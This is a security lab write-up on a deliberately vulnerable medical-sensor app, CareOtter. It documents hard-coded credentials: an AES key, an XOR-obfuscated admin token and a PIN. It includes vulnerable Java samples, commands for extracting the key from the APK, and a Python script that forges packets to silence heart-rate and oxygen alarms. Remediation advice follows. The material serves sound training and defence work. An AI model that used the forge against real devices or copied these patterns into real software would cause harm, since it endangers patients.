---
id: M1
title: "Improper Credential Usage"
category: Mobile
status: DONE
severity: High
owasp: "Mobile M1 — Improper Credential Usage"
cwe: "CWE-798 (Use of Hard-coded Credentials) / CWE-321 (Use of Hard-coded Cryptographic Key) / CWE-306 (Missing Authentication for Critical Function)"
source_docs:
  - "vulnzoo_apps/careotter_app (CareOtterConfig.java CSCP key, MainActivity default thresholds)"
  - "Vulns/IoT/IoT7_Insecure_Data_Transfer_and_Storage.md (device-side CSCP acceptance, no clinical range validation, DoS)"
  - "Vulns/Mobile/M5_Insecure_Communication.md (the unauthenticated, unencrypted channel the forged packet rides)"
affected_components:
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/CareOtterConfig.java — CSCP_KEY, buildThresholdPacket"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/MainActivity.java — DEFAULT_THRESHOLDS"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/IgpClient.java — ENCODED_TOKEN / decodeToken (XOR-obfuscated admin token)"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/BleWifiProvisioner.java — PIN (hard-coded 6767)"
  - "labs/careotter/files/opt/medical-sensor/ble_server.py — AlertThresholdChrc (0xFF01) accepts any correctly-keyed packet"
verified_date: ""
---

# M1 — Improper Credential Usage

> **Status:** DONE
> **OWASP:** Mobile M1 — Improper Credential Usage
> **CWE:** CWE-798 / CWE-321 / CWE-306
> **Severity:** High

---

## Why It Matters

The CareOtter alarm and threshold feature lets the patient or caregiver set the limits that fire a clinical alert — "warn me if BPM goes above 120 or SpO2 drops below 90." Those limits are written to the device over BLE characteristic `0xFF01` in a packet the vendor calls CSCP v1 and markets as "AES-128 military-grade encryption." OWASP Mobile M1 is about how an app handles the credentials that protect exactly this kind of operation. CareOtter handles them in the worst way: the AES key that makes the "encryption" is a hard-coded, fleet-wide constant compiled into the patient APK. A credential that should be secret and per-device is shipped to every patient's phone, so the encryption stops being a security boundary and becomes a format anyone can reproduce.

The consequence is direct patient-safety risk. An attacker who pulls the key from the APK forges a valid threshold packet that sets clinically impossible limits — `bpm_max = 255` so a tachycardic arrest never alarms, `spo2_min = 0` so severe hypoxia never alarms — and the device accepts it, because the key checks out and the device performs no clinical range validation. One key recovered from one APK silences alarms across the entire fleet.

---

## OWASP Classification

| Category | Role |
|---|---|
| **M1 — Improper Credential Usage** | Primary — multiple fleet-wide secrets are hard-coded in the patient APK and recovered with `strings`/`jadx`: the AES-128 CSCP key (§1.1), the default clinical thresholds (§1.2), the XOR-obfuscated IGP admin token and the provisioning PIN (§1.5) — CWE-798 / CWE-321 |
| **M3 — Insecure Authentication/Authorization** | Secondary — CSCP "encryption" is not authentication. With the key known, any unpaired client writes thresholds, so the device accepts a forged packet with no session or credential (CWE-306). The operation-authentication and replay angle is owned by [[M3_Insecure_Authentication_Authorization]] |
| **IoT I7 (device side)** | Cross-ref — the device transfers clinical thresholds under this fleet-wide ECB key and applies them with no range check, including the `bpm_min >= bpm_max` DoS. Owned by [[IoT7_Insecure_Data_Transfer_and_Storage]] |
| **M5 (channel)** | Cross-ref — the forged packet rides the unauthenticated, unencrypted BLE link. Owned by [[M5_Insecure_Communication]] |

This page owns the credential defect from the mobile side. The device-side acceptance and the DoS are IoT7, the channel is M5. They are not duplicated here.

---

## 1.1 — Fleet-wide CSCP key hard-coded in the APK

`CareOtterConfig.java` ships the complete CSCP v1 implementation — the key, the packet format, the encrypt and CRC routines — inside the patient app. The key is a 16-byte ASCII constant, identical on every device, and the source self-documents it:

```java
// CareOtterConfig.java
// VULNERABILITY: hardcoded AES key — identical across all CareOtter devices
private static final byte[] CSCP_KEY   = "careotter-key-16".getBytes(StandardCharsets.UTF_8);
private static final int    CSCP_MAGIC = 0xCAFE0DDA;

// VULNERABILITY: no range validation — bpmMin=0, bpmMax=255, spo2Min=0 accepted.
public static byte[] buildThresholdPacket(int bpmMin, int bpmMax, int spo2Min) throws Exception {
    byte[] plaintext = new byte[16];
    plaintext[0] = (byte) (bpmMin  & 0xFF);
    plaintext[1] = (byte) (bpmMax  & 0xFF);
    plaintext[2] = (byte) (spo2Min & 0xFF);
    SecretKeySpec keySpec = new SecretKeySpec(CSCP_KEY, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");   // ECB, deterministic, replayable
    cipher.init(Cipher.ENCRYPT_MODE, keySpec);
    byte[] ciphertext = cipher.doFinal(plaintext);
    CRC32 crc32 = new CRC32(); crc32.update(ciphertext);
    ByteBuffer buf = ByteBuffer.allocate(24).order(ByteOrder.BIG_ENDIAN);
    buf.putInt(CSCP_MAGIC); buf.putInt((int) crc32.getValue()); buf.put(ciphertext);
    return buf.array();
}
```

Recovering the key needs no runtime access, only the APK:

```bash
strings careotter_app.apk | grep -i careotter
# careotter-key-16

jadx careotter_app.apk -d out/ && grep -rn "CSCP_KEY" out/
# private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(...)
```

The identical key lives in the firmware (`ble_server.py`), so it is recoverable from either end, and the device on `0xFF01` accepts any packet that decrypts and CRC-checks under it — see [[IoT7_Insecure_Data_Transfer_and_Storage]] for the device side. This is the M1 anti-pattern in full: a shared static secret authenticates "someone who has the key," never "this authorized user," and because the same binary ships to the whole fleet, one extraction compromises every unit.

> **Accurate note on wiring.** `CareOtterConfig.buildThresholdPacket` / `parseResponse` are present in the APK but not currently called by the UI — the app's threshold control (`MainActivity` -> `BleMonitorClient.writeThreshold`) writes raw JSON, which the device's CSCP validator rejects (length != 24). So the working write against the genuine device is the attacker's forged CSCP packet built from the extracted key. `CareOtterConfig` is the reference the attacker reproduces, and the proof that the key and algorithm are shipped to every phone. The raw-JSON UI path is the separate M4 input-validation facet in `CareOtter_App.md`.

---

## 1.2 — Hard-coded default thresholds

A smaller credential-class exposure sits in `MainActivity`: the default clinical thresholds are a hard-coded string, visible by decompilation, so an attacker learns the exact limits the patient relies on before touching the device.

```java
// MainActivity.java
// VULNERABILITY #4: hardcoded thresholds in source — visible via static analysis / APK decompilation
private static final String DEFAULT_THRESHOLDS = "{\"bpm_min\":40,\"bpm_max\":120,\"spo2_min\":90}";
```

These are configuration baked into the client rather than provisioned, the same hard-coding sin as the key (CWE-798), and they tell the attacker which values are "normal" so a fabricated-vitals attack (see [[M5_Insecure_Communication]] §5.1) can stay just inside them.

---

## 1.3 — The forge: extracted key to lethal thresholds

With the key in hand, the attacker reproduces `buildThresholdPacket` and forges a packet the device accepts. This mirrors the Java exactly (3 threshold bytes + 13 nulls, AES-128-ECB, CRC32 over the ciphertext, big-endian magic + crc + ciphertext):

```python
from Crypto.Cipher import AES
import struct, binascii

KEY   = b"careotter-key-16"     # lifted from CareOtterConfig.CSCP_KEY (1.1)
MAGIC = 0xCAFE0DDA

def forge(bpm_min, bpm_max, spo2_min):
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", MAGIC, crc) + ct          # 24-byte CSCP v1 packet

pkt = forge(40, 255, 0)   # bpm_max=255 -> tachycardia never alarms ; spo2_min=0 -> hypoxia never alarms
```

The runnable end-to-end (discover the device, write `pkt` to `0xFF01` over the unpaired link) is [[M5_Insecure_Communication]] Variant E, and the device-side acceptance and the `bpm_min >= bpm_max` deferred-crash DoS are [[IoT7_Insecure_Data_Transfer_and_Storage]] §7.1. M1 supplies the key, M5 supplies the channel, IoT7 supplies the device that trusts the packet.

---

## 1.4 — The device performs no clinical range validation (the second half)

Forging is only lethal because nothing downstream rejects clinically impossible values. The device-side write handler validates only the cryptographic envelope (magic, CRC, size, AES) and then applies whatever decrypts:

```python
# ble_server.py — AlertThresholdChrc.WriteValue (device side, owned by IoT7)
thresholds = self._decrypt_and_unpack(raw)     # checks magic / CRC / 24-byte / AES only
# VULNERABILITY: no clinical range validation — bpm_min=0, bpm_max=255, spo2_min=0 accepted
alert_thresholds["bpm_min"]  = thresholds["bpm_min"]
alert_thresholds["bpm_max"]  = thresholds["bpm_max"]
alert_thresholds["spo2_min"] = thresholds["spo2_min"]
```

So `spo2_min = 0` and `bpm_max = 255` are stored without objection, and `bpm_min >= bpm_max` drives the deferred `ZeroDivisionError` that stops all BLE notifications. This is the device half of the chain, documented and owned by [[IoT7_Insecure_Data_Transfer_and_Storage]] — it is named here because the missing range check is what turns the M1 key-leak into a patient-safety outcome.

---

## 1.5 — Other hard-coded credentials in the same APK

The CSCP key is the lethal one, but Improper Credential Usage in this app is not limited to it. The same APK hard-codes two more secrets, each an instance of the M1 anti-pattern.

**XOR-obfuscated IGP admin token (`IgpClient.java`).** The device administration token is shipped in the APK, "protected" only by a single-byte XOR that the app itself reverses in `decodeToken()` — and so does the attacker:

```java
// IgpClient.java — admin token XOR-obfuscated with key 0x5A — trivially reversible
private static final byte[] ENCODED_TOKEN = { 0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,
                                              0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C };
public static String decodeToken() {
    byte[] r = new byte[ENCODED_TOKEN.length];
    for (int i = 0; i < ENCODED_TOKEN.length; i++) r[i] = (byte) (ENCODED_TOKEN[i] ^ 0x5A);
    return new String(r);   // -> "OtterMobile2026"
}
```

XOR with a constant is encoding, not encryption — `bytes(b ^ 0x5A for b in ENCODED_TOKEN)` recovers `OtterMobile2026` in seconds. This is the textbook M1 "false sense of security": a reversible transform mistaken for a secret. The token value is the device's global admin credential, owned device-side by [[IoT1_Weak_Guessable_Hardcoded_Passwords]] — M1 owns the fact that the mobile client carries it, obfuscated rather than secured.

**Hard-coded provisioning PIN (`BleWifiProvisioner.java`).** The 4-digit factory PIN is a plain literal in the APK:

```java
// BleWifiProvisioner.java
private static final String PIN = "6767";   // hardcoded provisioning PIN (P3)
```

It is the same fleet-wide PIN that gates the hidden BLE provisioning backdoor, owned device-side by [[IoT2_Insecure_Network_Services]] §2.4. Hard-coding it in the mobile client is the M1 facet — a credential that should be per-device reduced to a constant compiled into every phone.

Both follow the §1.1 pattern: a secret that should be confidential and per-device is a shared constant in the shipped binary, recovered with `strings`/`jadx`, so compromising one APK compromises the fleet.

---

## Clinical Impact

| Vector | Consequence | Patient Safety Risk |
|---|---|---|
| Key extracted from one APK | Forge valid CSCP packets for the entire fleet | Critical — fleet-wide blast radius from a single download |
| `bpm_max = 255` | A tachycardic or arresting patient never triggers an alarm | Critical — silent suppression of a life-safety alert |
| `spo2_min = 0` | Severe hypoxia never triggers an alarm | Critical — silent suppression of a life-safety alert |
| `bpm_min >= bpm_max` | Notification loop crashes ~2 s later (IoT7 DoS) | High — monitoring stops with no error to the clinician |
| Default thresholds disclosed | Attacker knows the "normal" band to hide inside | Medium — strengthens a fabricated-vitals attack |

---

## How It Should Be

- **Per-device keys, never a fleet-wide constant.** Provision a unique key per unit at manufacturing into a secure element / TPM, so recovering one device or one APK does not compromise the fleet. Eliminates CWE-798 / CWE-321.
- **Never ship the key in the client.** If a mobile key is unavoidable, hold it in the Android Keystore (hardware-backed, non-exportable), not as a `byte[]` constant a `strings` run recovers.
- **Encrypt for confidentiality, authenticate separately.** A shared symmetric key used as a de-facto authorization gate is the M1/M3 confusion. Require LE Secure Connections pairing and a per-session authenticated channel before any write to `0xFF01`.
- **Validate clinical ranges on the device (defense in depth).** Reject `bpm_min >= bpm_max`, `spo2_min` outside a sane band, and physiologically impossible values, so even a correctly-keyed packet cannot set lethal limits.
- **Do not hard-code configuration.** Default thresholds should be provisioned, not compiled into the APK.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Key management | Per-device key in a secure element, provisioned at manufacturing | Remove the fleet-wide shared secret (CWE-798 / CWE-321) |
| Mobile storage | Android Keystore, hardware-backed and non-exportable | Stop static recovery of the key from the APK |
| Auth | LE Secure Connections + authenticated session before `0xFF01` writes | Make "encrypted" require "authenticated" (CWE-306) |
| Device validation | Clinical range checks on received thresholds | Stop lethal values even with a valid key |
| Config | Provision default thresholds, do not hard-code them | Remove the disclosed-config exposure |

---

## Verification Checklist

- [ ] **§1.1 (key)**: `strings careotter_app.apk | grep careotter` and `jadx … | grep CSCP_KEY` both recover `careotter-key-16`, and the same key is in `ble_server.py`.
- [ ] **§1.2 (defaults)**: `DEFAULT_THRESHOLDS` is recoverable from the decompiled `MainActivity`.
- [ ] **§1.3 (forge)**: a packet from `forge(40, 255, 0)` is 24 bytes and matches the structure built by `CareOtterConfig.buildThresholdPacket`.
- [ ] **§1.3 / §1.4 (accepted)**: writing the forged packet to `0xFF01` (per [[M5_Insecure_Communication]] Variant E) is accepted by the device with no pairing, and `0xFF01` reads back the lethal thresholds.
- [ ] **§1.4 (no range check)**: `spo2_min = 0` and `bpm_max = 255` are stored unmodified, and `forge(120, 40, 90)` triggers the IoT7 deferred-crash DoS.
- [ ] **§1.5 (other credentials)**: `ENCODED_TOKEN ^ 0x5A` (or `IgpClient.decodeToken()`) recovers `OtterMobile2026` from the decompiled APK, and `BleWifiProvisioner.PIN` is the literal `6767`.

---

## Glossary

| Term | Definition |
|---|---|
| **CSCP** | **CareOtter Secure Config Protocol** (version 1, "CSCP v1"). The vendor's proprietary BLE format for writing clinical alert thresholds (`bpm_min`, `bpm_max`, `spo2_min`) to GATT characteristic `0xFF01`. A 24-byte packet: `[magic 4B = 0xCAFE0DDA][CRC32 4B over the ciphertext][AES-128-ECB(3 threshold bytes + 13 null pad) 16B]`, keyed with the fleet-wide constant `careotter-key-16`. Marketed as "AES-128 military-grade encryption," but the key is hard-coded in the patient APK (§1.1) and the format carries no session authentication, so "Secure" is branding, not a property. Expanded in `docs/CareOtter/Architecture_Analysis.md`. |

---

## References

- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/CareOtterConfig.java` — `CSCP_KEY`, `CSCP_MAGIC`, `buildThresholdPacket`, `parseResponse` (the shipped CSCP implementation with the hard-coded key).
- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/MainActivity.java` — `DEFAULT_THRESHOLDS`, the threshold-write UI (raw JSON, the M4 facet).
- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/IgpClient.java` — `ENCODED_TOKEN` / `decodeToken` (XOR-0x5A admin token → `OtterMobile2026`), device-side owner [[IoT1_Weak_Guessable_Hardcoded_Passwords]].
- `vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/BleWifiProvisioner.java` — `PIN` (`6767`), device-side owner [[IoT2_Insecure_Network_Services]] §2.4.
- `labs/careotter/files/opt/medical-sensor/ble_server.py` — `AlertThresholdChrc` on `0xFF01` (validates the envelope only, no clinical range check).
- `docs/CareOtter/Mobile/CareOtter_App.md` — the M1 (CSCP hard-coded key) and M3 (encryption-as-false-auth) sections this page consolidates.
- [[IoT7_Insecure_Data_Transfer_and_Storage]] — device-side CSCP transfer under the fleet key, no range validation, and the deferred ZeroDivisionError DoS.
- [[M5_Insecure_Communication]] — the unauthenticated, unencrypted channel (Variant E writes the forged packet).
